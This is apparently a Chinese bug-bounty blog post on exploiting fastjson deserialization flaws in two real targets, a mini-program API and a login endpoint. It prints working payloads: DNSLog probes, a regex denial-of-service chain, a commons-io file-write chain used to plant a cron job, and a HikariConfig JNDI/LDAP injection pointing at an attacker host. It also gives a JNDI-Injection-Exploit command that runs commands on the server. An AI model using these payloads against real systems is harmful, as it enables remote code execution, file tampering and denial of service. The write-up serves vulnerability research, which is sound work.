#  SRC挖掘 | fastjson反序列化漏洞实战   
 sec0nd安全   2025-03-05 22:19  
  
**1、前言**  
  
前段时间挖掘src遇到了两个fastjson反序列化漏洞，分享一下挖掘思路与打法。  
  
2、漏洞挖掘  
  
漏洞1、  
  
该小程序需要输入账号密码才能访问，这种时候可以通过反编译小程序代码，拼接路径接口进行测试。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibeKKT36Dm5dDcsnb36rcCLaWOj3p7oibF4LNhLuwNehHrFrHARXKEMWMiajNNvxMBAJgmna0YwbjyQ/640?wx_fmt=png&from=appmsg "")  
  
  
将小程序反编译后（过程省略，反编译教学可看我之前的文章：微信小程序反编译与动态调试教学），使用py脚本获取接口路径，再用bp批量跑一遍。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibeKKT36Dm5dDcsnb36rcCLGKtbQFHJbaIjX0GlsokonXic3KvEbEqbMHKAlZoC6zPrSrxxmo20AgA/640?wx_fmt=png&from=appmsg "")  
  
跑出来的接口其中有一条显示缺少参数，明显这个接口不需要鉴权。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uibib5d3SgJN7qESkpyxgWib6yqO2jibfdKicVbfxpHLokXeQeiceXgAftb2Ip8x9yeJMcENE1RPB5IwpPrw/640?wx_fmt=png&from=appmsg "")  
  
  
从小程序代码可知这个是json请求的接口，试着打一下fastjson的探测出网链（版本范围1.2.24-1.2.83）  
  
```
{"@type":"java.net.Inet4Address","val":"dnslog.com"}
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0QIthSQcewS0LwUvwAae8HWhuSW4fkSuN31a5qXic73hDyeqEsqzUD9A/640?wx_fmt=png&from=appmsg "")  
  
  
成功收到请求,这个链没有危害，只能证明是否存在漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw059TuLv5XbpXBAiaZdZ5PdJTp53ymCCzX766ichu851nzEmNImiatSIlzA/640?wx_fmt=png&from=appmsg "")  
  
  
试试删除一个括号，没有报错回显，看来没办法通过报错信息来判断版本，只能盲打了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0xO29yaLT5TECicSEbHSYdH2ctwiaeqlQ16aF5RGhibKIX0pPd6a65al8g/640?wx_fmt=png&from=appmsg "")  
  
  
试一下ddos链，通过数据包响应时间判断是否成功  
（版本范围1.2.36-1.2.62）  
```
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```  
  
  
等了10秒仍然没有响应包，看来是执行成功了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0Zic30h0GJZ0ZG3RiaHdtibERIhEyUTUFhU5gzK7OHlesNxCg9HE32ic9pQ/640?wx_fmt=png&from=appmsg "")  
  
可判断大概版本在1.2.36-1.2.62之间，因为没有报错信息，也无法判断服务器存在什么类，就只能按照网上的payload盲打了（过程省略）。  
  
最后所有利用链都试得差不多了但没有成功，将目光转移到用fastjson写文件到定时任务中执行命令。ping服务器查看TTL可知是linux服务器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0UauicIyYI6d4FqicaKdl1o9JQEiaHMahb86gulEBaO3fxPOl9cAK6nicibg/640?wx_fmt=png&from=appmsg "")  
  
  
被框起来的地方就是要写入的内容  
```
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""testaaa"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"1.txt",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0gRbr03C517VcMRABrtSscgghx7HgMETgYsc2V4yoqSIbVKrFrF9eug/640?wx_fmt=png&from=appmsg "")  
  
  
从该文章中可知写入的  
字符串长度要比较长才能写入到目标文件里面  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0R1jgNibBFxMpro9M14EHBS1BibrdB76AiaNPAzk5aODUvWpHOjZkJtjbw/640?wx_fmt=png&from=appmsg "")  
  
  
准备写入定时任务执行ping命令，还需要写入大量字符串，为了避免定时任务文件报错，将多余的字符串注释掉。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0Y9QMjUa2CUtvK5pFNos0iatGxv5YricTKZNpUcK0GV8AoM0CoonzCiafQ/640?wx_fmt=png&from=appmsg "")  
  
  
因为数据包太大了，使用bp不太好发，所以我这里使用了YAKIT发包，将定时任务文件写进去  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0LuumPMNfhS6QjbWmS6WUJFbwaFiaErFW6KnqL2tOvzNsFepZCAE2BXw/640?wx_fmt=png&from=appmsg "")  
  
过了一分  
钟收  
到了dnslog请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0Itjzetre0DibkHQKXOb6boUWhxDnkBy6bSnhDSEKGdicbPt1qMPjIvibw/640?wx_fmt=png&from=appmsg "")  
  
漏洞2、  
  
  
打开是一个登录框，点击登录抓包。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0B00g4gll9SiaEaDFYSkdQibjyAAMT8qcZoE49tYR0ZV8F98bG4kibD30A/640?wx_fmt=png&from=appmsg "")  
  
  
也是json请求的  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0aic1ZkcOgITwzkJeJkxGwvcXLq2H4gLm23rjRnfXICBWWbsm70Tqp4A/640?wx_fmt=png&from=appmsg "")  
  
  
  
删除一个括号，存在报错信息，有报错信息方便判断fastjson版本了  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0AsMo2dp2us7A9fC2ylzfUapsxMh4BMfaA9uXmDgTk3tRFS7pHBAib1A/640?wx_fmt=png&from=appmsg "")  
  
  
报错出版本为1.2.54  
```
{"@type":"java.lang.AutoCloseable"a["test ":1]
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0mLSqgjGA9ws1AOEnL95vIibOcSrw5ChYFSiaWfPMH2SAgo5vCtIaD0CQ/640?wx_fmt=png&from=appmsg "")  
  
判断autoType是否开启，如果开启了，就会收到dnslog请求  
```
[
  {
    "@type": "java.net.CookiePolicy"
  },
  {
    "@type": "java.net.Inet4Address",
    "val": "xxx.eu.org"
  }
]
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0132NLzOaEZ2yUshv4dWEcsIM537N70nWKSiak4qx0icZpF1Njl8WRv1g/640?wx_fmt=png&from=appmsg "")  
  
收到请求了,说明autoType开启了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw08p6OT2A8RUKHribmVsdGFoK4ibzNgCL3dg9clEffX3E799uVpw9142mQ/640?wx_fmt=png&from=appmsg "")  
  
  
通过@type判断目标服务器存在什么类，@type中不存在的类名和存在的类名回显是不一样的  
  
存在的类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw090yQqSXmzdSNKF5mO4g57HJ7YuUzA1MhVgfDpnpXBAxbBGholxL0Dw/640?wx_fmt=png&from=appmsg "")  
  
不存在的类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0dB1TBBA87bTwtiaUO2A2NlCnnaoJJvTfS7SVssVJfjol365R05UpzFQ/640?wx_fmt=png&from=appmsg "")  
  
  
直接爆破一遍，看看存在什么类，就可以知道打什么链了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0p5NO6ksdHS5JFj1dK61LDCD1XgrEIIvCVhDf4aa30NZeD86dVQkHWA/640?wx_fmt=png&from=appmsg "")  
  
存在com.zaxxer.hikari.HikariConfig类，那就可以打这条链了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw05AkOawQibGUO46NAKZwc2ERwFgc9zCy5WAdyxP9JrcyOic5YZmIfN28g/640?wx_fmt=png&from=appmsg "")  
  
目标服务器的fastjson版本符合条件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0AJHKM38rTJUqjo6hm0C2ulscd9PRIaR6f2dscpHwNQWfjuhE1CRlJA/640?wx_fmt=png&from=appmsg "")  
```
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://xxx.org"}
```  
  
先试一下可不可以收到请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0X7ndiasszSvLZZMovWrmUQhgzibCricpTRbgI3TUD9o6iapbUaWLS7J4yA/640?wx_fmt=png&from=appmsg "")  
  
收到请求了，直接开打  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0E2xialOaLl6SicxeYzS02bKzcrKNZydO3bHS5ficZVUA77gzBfBnCRGpw/640?wx_fmt=png&from=appmsg "")  
  
  
在服务器起一个jndi服务，执行ping命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0snvJTyYUib98s4CxC12sclKjHQX6esg8whlaLKAbXjBpEviam0sZo5zg/640?wx_fmt=png&from=appmsg "")  
```
java -jar JNDI-Injection-Exploit-Plus-2.2-SNAPSHOT-all.jar -C ping bd1e1a32fe.ipv6.1433.eu.org
```  
  
  
标红的这里是要打的反序列化链，例如cc链cb链那些  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uibib5d3SgJN7qESkpyxgWib6yqc4vRiahLuxiaQ8IHSOQRtw4BpU9ZTgWM6YNQR86tT93CzBZkRy6blUBw/640?wx_fmt=png&from=appmsg "")  
```
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://ip:port/deserialCommonsBeanutils1"}
```  
  
  
链子太多一个一个试太久了，直接bp跑一遍也是可以的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0VuvJEqgeKmm595iaictYicXgQcPj4Zc6texX9mqGywoxgGpqcjS1BZN3A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0vR7xSGAjA2jAd3TxGULIIxvsXB5fQskSwNdq0DNY7wOIPLIgZabAVA/640?wx_fmt=png&from=appmsg "")  
  
放到字典跑  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0qeibDamuv1nOghVhVrLcFDMtwRrfUVGXM2F9ztYJI1nluD2LuQROsrg/640?wx_fmt=png&from=appmsg "")  
  
线程记得调低一点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0cAQqCVHGHZtwyCMjcLmgh654sOtPdiagxH09cfQSENIzEKjSLmjzqsQ/640?wx_fmt=png&from=appmsg "")  
  
回到dns平台，收到请求，服务器执行了ping命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib90HkqMicBLDXXTslibCrBPw0KTnrOKU9od3f1f4h1KENeR6UAKjxx19pKdxD5W610dBliaEgqmUkbyA/640?wx_fmt=png&from=appmsg "")  
  
  
补充：  
  
这一步如果想要知道对方服务器具体可以打什么链的话，也是可以用上一篇文章提到的urldns工具获取回显的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uibib5d3SgJN7qESkpyxgWib6yqgEIE3mZdGUnEoW16O3uX6piaicIrh2WHTw5b7HyrGYhhMS8jIUHBVzdg/640?wx_fmt=png&from=appmsg "")  
  
（可以使用这个dns平台接收请求https://dig.pm）  
  
先在vps将服务运行起来  
```
java -jar Urldns.jar ldap all xxx.eu.org
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uibib5d3SgJN7qESkpyxgWib6yqWKZQFHia6ec8E7iaUbib4kTPtiaiaoHZ0SPl9sIF94TJae1aSjgJvc6XDkg/640?wx_fmt=png&from=appmsg "")  
  
接着发起请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uibib5d3SgJN7qESkpyxgWib6yqwV2oicP7lOeBFiaHdcAhtX5ZalVmAxVxOze0xJibIYj3QOafKHD0sUPibg/640?wx_fmt=png&from=appmsg "")  
  
查看dnslog平台，收到回显，就可以判断打什么链了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uibib5d3SgJN7qESkpyxgWib6yq6QIWszcBiaruky4QpaHEpEO27JHS88GNOicibiak9dyphtG2iauPatHaNXw/640?wx_fmt=png&from=appmsg "")  
  
  
  
